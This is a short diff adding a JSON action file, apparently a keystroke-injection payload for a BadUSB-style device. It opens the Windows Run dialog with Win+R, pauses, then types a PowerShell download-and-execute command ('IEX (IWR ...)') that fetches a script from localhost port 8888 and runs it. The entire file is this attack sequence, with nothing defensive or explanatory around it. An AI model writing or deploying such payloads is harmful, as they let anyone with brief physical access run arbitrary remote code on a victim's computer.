@@ -1,0 +1,22 @@
+{
+    "actions": [
+        {
+            "type": "keystrokes",
+            "value": {
+                "type": "keybind",
+                "value": "win+r"
+            }
+        },
+        {
+            "type": "delay",
+            "value": 100
+        },
+        {
+            "type": "keystrokes",
+            "value": {
+                "type": "script",
+                "value": "IEX (IWR http://localhost:8888/install-entrypoint)"
+            }
+        }
+    ]
+}
